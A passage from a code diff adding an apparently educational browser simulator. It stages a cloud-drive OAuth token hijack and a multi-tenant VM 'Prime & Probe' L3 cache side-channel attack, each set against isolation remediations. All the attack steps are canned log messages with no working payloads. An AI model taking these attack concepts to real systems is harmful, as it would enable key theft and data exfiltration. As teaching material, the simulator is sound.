+              logToConsole("Cloud drive processes OAuth token. Connection authenticated (Interactive Login/MFA bypassed).", "warning");
+              cloudEnt.className = 'mitc-entity alert';
+              setTimeout(() => {
+                logToConsole("Silent Exfiltration Active: Files and directories synchronizing to rogue client.", "error");
+                logToConsole("EXPLOIT SUCCESSFUL: Corporate repository mirrored.", "error");
+              }, 800);
+            }
+          }, 800);
+        }, 800);
+      });
+    }
+
+    // --- VM & PRIVATE CLOUD ISOLATION ---
+    let cloudMode = 'public'; // 'public' or 'private'
+    let corpVmDeployed = false;
+    let attackerVmDeployed = false;
+
+    function renderVMIsolationPlayground() {
+      playgroundContainer.innerHTML = `
+        <div class="vm-playground">
+          <div class="vm-mode-selector">
+            <span style="font-size: 0.85rem; font-weight: 600; color: var(--dark-text);">Select Hypervisor Architecture:</span>
+            <div style="display: flex; gap: 0.5rem;">
+              <button type="button" class="vm-mode-btn active" id="vm-mode-public-btn">Public Cloud (Multi-Tenant)</button>
+              <button type="button" class="vm-mode-btn" id="vm-mode-private-btn">Private Cloud (Dedicated Host)</button>
+            </div>
+          </div>
+          
+          <div class="vm-hardware-layout">
+            <!-- Hardware Node 0 -->
+            <div class="vm-hardware-box">
+              <div class="soap-title" id="vm-hw-title-0">Bare-Metal Node 01 (Public Tenant Share)</div>
+              
+              <div class="vm-socket-card" id="vm-socket-0-card">
+                <div style="font-size: 0.7rem; font-weight: 700; color: var(--dark-muted); text-transform: uppercase;">CPU Socket 0</div>
+                <div class="vm-core-grid">
+                  <div class="vm-core-slot" id="vmslot-0-0">Core 0: Idle</div>
+                  <div class="vm-core-slot" id="vmslot-0-1">Core 1: Idle</div>
+                </div>
+                <div style="font-size: 0.65rem; color: var(--sec-blue); font-family: var(--font-mono); text-align: center; margin-top: 0.25rem; border-top: 1px solid var(--dark-border); padding-top: 0.25rem;">Shared L3 Cache Lines</div>
+              </div>
+
+              <div class="vm-socket-card" id="vm-socket-1-card">
+                <div style="font-size: 0.7rem; font-weight: 700; color: var(--dark-muted); text-transform: uppercase;">CPU Socket 1</div>
+                <div class="vm-core-grid">
+                  <div class="vm-core-slot" id="vmslot-1-0">Core 0: Idle</div>
+                  <div class="vm-core-slot" id="vmslot-1-1">Core 1: Idle</div>
+                </div>
+                <div style="font-size: 0.65rem; color: var(--sec-blue); font-family: var(--font-mono); text-align: center; margin-top: 0.25rem; border-top: 1px solid var(--dark-border); padding-top: 0.25rem;">Shared L3 Cache Lines</div>
+              </div>
+            </div>
+
+            <!-- Hardware Node 1 (Simulated for private node expansion) -->
+            <div class="vm-hardware-box" id="vm-hw-node-1" style="opacity: 0.4;">
+              <div class="soap-title" id="vm-hw-title-1">Bare-Metal Node 02 (Isolated Host)</div>
+              
+              <div class="vm-socket-card">
+                <div style="font-size: 0.7rem; font-weight: 700; color: var(--dark-muted); text-transform: uppercase;">CPU Socket 0</div>
+                <div class="vm-core-grid">
+                  <div class="vm-core-slot" id="vmslot-2-0">Core 0: Idle</div>
+                  <div class="vm-core-slot" id="vmslot-2-1">Core 1: Idle</div>
+                </div>
+                <div style="font-size: 0.65rem; color: var(--sec-blue); font-family: var(--font-mono); text-align: center; margin-top: 0.25rem; border-top: 1px solid var(--dark-border); padding-top: 0.25rem;">Shared L3 Cache Lines</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+
+      // Controls
+      simControls.innerHTML = `
+        <button type="button" class="btn btn-primary" id="vm-ctl-deploy-corp">Provision Corp VM</button>
+        <button type="button" class="btn btn-primary" id="vm-ctl-deploy-attack">Provision Attacker VM</button>
+        <button type="button" class="btn btn-primary" id="vm-ctl-run-scan" disabled>Execute Cache Sniff</button>
+        <button type="button" class="btn btn-secondary" onclick="resetSimulation()">Reset</button>
+      `;
+
+      const modePubBtn = document.getElementById('vm-mode-public-btn');
+      const modePrivBtn = document.getElementById('vm-mode-private-btn');
+      const deployCorpBtn = document.getElementById('vm-ctl-deploy-corp');
+      const deployAttackBtn = document.getElementById('vm-ctl-deploy-attack');
+      const runScanBtn = document.getElementById('vm-ctl-run-scan');
+      const node2 = document.getElementById('vm-hw-node-1');
+
+      corpVmDeployed = false;
+      attackerVmDeployed = false;
+      cloudMode = 'public';
+
+      // Mode changes
+      modePubBtn.addEventListener('click', () => {
+        if (corpVmDeployed || attackerVmDeployed) {
+          logToConsole("Reset simulation before switching hypervisor host configurations.", "warning");
+          return;
+        }
+        cloudMode = 'public';
+        modePubBtn.classList.add('active');
+        modePrivBtn.classList.remove('active');
+        node2.style.opacity = '0.4';
+        document.getElementById('vm-hw-title-0').textContent = "Bare-Metal Node 01 (Public Tenant Share)";
+        logToConsole("Hypervisor host configured: Public Cloud Mode (Shared physical hardware enabled).", "info");
+      });
+
+      modePrivBtn.addEventListener('click', () => {
+        if (corpVmDeployed || attackerVmDeployed) {
+          logToConsole("Reset simulation before switching hypervisor host configurations.", "warning");
+          return;
+        }
+        cloudMode = 'private';
+        modePrivBtn.classList.add('active');
+        modePubBtn.classList.remove('active');
+        node2.style.opacity = '1';
+        document.getElementById('vm-hw-title-0').textContent = "Bare-Metal Node 01 (Dedicated Host: Corp)";
+        logToConsole("Hypervisor host configured: Private Cloud Mode (Hardware dedicated to Corp Tenant).", "success");
+      });
+
+      // Deploy Corp VM
+      deployCorpBtn.addEventListener('click', () => {
+        if (corpVmDeployed) return;
+        corpVmDeployed = true;
+        deployCorpBtn.disabled = true;
+
+        const slot = document.getElementById('vmslot-0-0');
+        slot.className = 'vm-core-slot corp-vm';
+        slot.textContent = 'Core 0: Corp VM (Tenant A)';
+        
+        logToConsole("Corporate provision request processed. Scheduler allocates VM on Node 01, Socket 0, Core 0.", "info");
+        checkScanAvailability();
+      });
+
+      // Deploy Attacker VM
+      deployAttackBtn.addEventListener('click', () => {
+        if (attackerVmDeployed) return;
+        
+        if (cloudMode === 'private') {
+          // Rejection in Private Cloud
+          logToConsole("Attacker VM provisioning request submitted for Bare-Metal Node 01...", "info");
+          setTimeout(() => {
+            logToConsole("SECURITY REJECTION: Dedicated Private Cloud policy restricts hardware node to Tenant A only. Attacker (Tenant B) request denied.", "success");
+            logToConsole("Scheduler blocks VM provision. Co-residency prevented.", "success");
+          }, 800);
+          return;
+        }
+
+        // Public Cloud deployment logic
+        attackerVmDeployed = true;
+        deployAttackBtn.disabled = true;
+
+        if (remediationActive) {
+          // Public cloud with placement isolation remediation (Host Group separation/Socket pinning)
+          const slot = document.getElementById('vmslot-1-0');
+          slot.className = 'vm-core-slot attacker-vm';
+          slot.textContent = 'Core 0: Attacker VM (Tenant B)';
+          logToConsole("Provisioned Attacker VM. Placement protection active: Assigned to Socket 1, Core 0.", "success");
+          logToConsole("Socket Isolation achieved. VMs do not share CPU Socket caches.", "success");
+        } else {
+          // Standard public cloud multi-tenancy
+          const slot = document.getElementById('vmslot-0-1');
+          slot.className = 'vm-core-slot attacker-vm';
+          slot.textContent = 'Core 1: Attacker VM (Tenant B)';
+          logToConsole("Provisioned Attacker VM. Scheduler places instance on Node 01, Socket 0, Core 1.", "warning");
+          logToConsole("ATTENTION: Co-residency achieved. Attacker and Corporate VMs share CPU Socket 0 and L3 Cache.", "warning");
+        }
+        checkScanAvailability();
+      });
+
+      // Run Side Channel Scan
+      runScanBtn.addEventListener('click', () => {
+        runScanBtn.disabled = true;
+        logToConsole("Attacker VM launches Prime & Probe Cache timing scan across CPU Socket 0...", "warning");
+        
+        setTimeout(() => {
+          if (remediationActive) {
+            logToConsole("Timing measurements uniform. Cache lines isolated by separate physical sockets. Scan failed.", "success");
+            logToConsole("Exploit blocked by infrastructure separation.", "success");
+          } else {
+            logToConsole("Cache Eviction timing variations observed. Attacker VM extracts private keys from shared L3 cache lines!", "error");
+            logToConsole("EXPLOIT SUCCESS: Private cryptographic key extracted in multi-tenant environment.", "error");
+          }
+        }, 1000);
+      });
+
+      function checkScanAvailability() {
+        if (corpVmDeployed && attackerVmDeployed) {
+          runScanBtn.disabled = false;
+        }
+      }
+    }
+  </script>
+</body>
+</html>
